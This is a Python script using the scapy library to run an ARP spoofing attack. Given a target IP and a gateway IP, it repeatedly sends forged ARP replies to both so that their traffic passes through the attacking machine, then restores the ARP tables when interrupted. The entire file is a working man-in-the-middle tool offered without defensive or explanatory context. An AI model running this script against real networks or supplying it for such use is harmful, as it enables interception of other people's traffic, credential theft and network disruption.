import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Route IP")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    try:
        return answered_list[0][1].hwsrc
    except:
        pass


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def run(target_ip, gateway_ip):
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C ..... Restore ARP tables.... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

options = get_arguments()
run(options.target_ip, options.gateway_ip)
